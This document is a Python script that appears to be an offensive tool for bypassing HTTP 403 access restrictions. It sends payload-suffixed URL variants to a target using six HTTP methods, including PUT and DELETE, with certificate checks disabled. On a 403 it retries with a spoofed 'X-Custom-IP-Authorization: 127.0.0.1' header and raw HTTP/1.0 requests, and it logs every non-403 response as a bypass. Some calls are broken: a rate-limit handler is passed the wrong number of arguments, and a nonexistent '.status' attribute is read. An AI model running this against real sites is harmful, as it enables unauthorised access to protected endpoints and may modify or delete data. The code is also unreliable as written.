import requests
import time
import http.client
from urllib.parse import urlparse
import re


# Function to read payloads from a file
def load_payloads(file_path):
    try:
        with open(file_path, 'r') as file:
            payloads = [line.strip() for line in file.readlines()]
        return payloads
    except FileNotFoundError:
        print(f"Error: File {file_path} not found.")
        return []

# Function to read headers from a file
def load_headers(file_path):
    try:
        headers = {}
        with open(file_path, 'r') as file:
            for line in file:
                if ': ' in line:
                    key, value = line.strip().split(': ', 1)
                    headers[key] = value
        return headers
    except FileNotFoundError:
        print(f"Error: File {file_path} not found.")
        return {}

def split_url_at_extension(url):
    # Regex pattern to match file extensions (e.g., .html, .php, .js, etc.)
    pattern = re.compile(r'(\.\w+)(\?|$)')
    
    # Find the position of the file extension
    match = pattern.search(url)
    if match:
        ext_pos = match.start(1)  # Start position of the extension
        # Split the URL at the file extension
        part1 = url[:ext_pos]
        part2 = url[ext_pos:]
        return True, part1, part2
    else:
        # If no extension is found, return the original URL and an empty string
        return False, url, ""

# Function to generate URL permutations by appending payloads at the end
def generate_url_permutations(base_url, payloads):
    permutations_list = []

    # Add payloads at the end of the base URL
    for payload in payloads:
        permuted_url = base_url.rstrip('/') + payload
        if validate_url(permuted_url):
            permutations_list.append(permuted_url)

    return permutations_list

# Function to validate the URL
def validate_url(url):
    try:
        result = urlparse(url)
        if all([result.scheme, result.netloc, result.path]):
            # Further validate if the netloc part of the URL is a valid domain
            if not (result.netloc.startswith('.') or result.netloc.endswith('.')):
                return True
        return False
    except Exception:
        return False

# Function to send an HTTP/1.0 request
def send_http10_request(url, method, headers):
    try:
        parsed_url = urlparse(url)
        connection = http.client.HTTPConnection(parsed_url.netloc)
        connection.putrequest(method, parsed_url.path + ('?' + parsed_url.query if parsed_url.query else ''), skip_host=True, skip_accept_encoding=True)
        for header, value in headers.items():
            connection.putheader(header, value)
        connection.endheaders()
        response = connection.getresponse()
        return response
    except Exception as e:
        print(f"Error making HTTP/1.0 request to {url}: {e}")
        return None

# Function to handle rate limiting (status code 429)
def handle_rate_limiting(response):
    retry_after = response.headers.get("Retry-After")
    if retry_after:
        wait_time = int(retry_after)
    else:
        wait_time = 1  # Default wait time if no "Retry-After" header is present
    print(f"Rate limited. Waiting for {wait_time} seconds before retrying...")
    time.sleep(wait_time)

# Function to log successful bypassed URLs
def log_successful_bypass(url, status_code,method):
    with open("bypassed_urls.txt", "a") as file:
        file.write(method + " :" +str(status_code) + " :" + url + "\n")

# Function to attempt request with different methods and headers
def attempt_request(url, method, headers, payloads):
    retries = 3  # Number of retries for handling 429 status code
    while retries > 0:
        try:
            response = requests.request(method, url, headers=headers, verify=False)
            print(f"{method} {url} - Status Code: {response.status_code}")

            if response.status_code == 429:
                handle_rate_limiting(response,response.status,method)
                retries -= 1
                continue

            if response.status_code != 403:
                log_successful_bypass(url,response.status_code,method)

            if response.status_code == 403:
                # Attempt to bypass with modified headers
                headers['X-Custom-IP-Authorization'] = '127.0.0.1'
                response = requests.request(method, url, headers=headers, verify=False)
                print(f"{method} {url} with custom header - Status Code: {response.status_code}")

                if response.status_code != 403:
                    log_successful_bypass(url,response.status,method)

                # HTTP/1.0 request
                response = send_http10_request(url, method, headers)
                if response:
                    print(f"HTTP/1.0 {method} {url} - Status Code: {response.status}")
                    if response.status != 403:
                        log_successful_bypass(url,response.status,method)

                # Additional attempts with payload in different parts of the URL
                for payload in payloads:
                    if payload in url:
                        continue
                    modified_url = url + payload
                    if validate_url(modified_url):
                        response = requests.request(method, modified_url, headers=headers, verify=False)
                        print(f"{method} {modified_url} - Status Code: {response.status_code}")
                        if response.status_code != 403:
                            log_successful_bypass(modified_url,response.status_code,method)

            break  # Exit the loop if the request was successful or if it's not a 429 status code

        except requests.exceptions.RequestException as e:
            print(f"Error making request to {url}: {e}")
            break

    # Add a delay between requests
    time.sleep(1)  # Sleep for 1 second

# Main function to run the tests
def main():
    base_url = input("Enter the base URL (e.g., https://www.example.com/api/v1/users): ").strip()
    payload_file = input("Enter the path to the payload wordlist file (e.g., payloads.txt): ").strip()
    print("Do not forget to change the Referer with the Domain name of the Origin. ")
    headers_file = input("Enter the path to the headers file (e.g., headers.txt): ").strip()

    payloads = load_payloads(payload_file)
    if not payloads:
        print("No payloads loaded. Exiting.")
        return

    headers = load_headers(headers_file)
    if not headers:
        print("No headers loaded. Exiting.")
        return
    has_extention, part_a, part_b = split_url_at_extension(base_url)
    if has_extention:
    	urls_to_test = generate_url_permutations(part_a, payloads)
    else:
    	urls_to_test = generate_url_permutations(base_url, payloads)
    methods = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE"]
    for url in urls_to_test:
        for method in methods:
            attempt_request(url, method, headers, payloads)

if __name__ == "__main__":
    main()

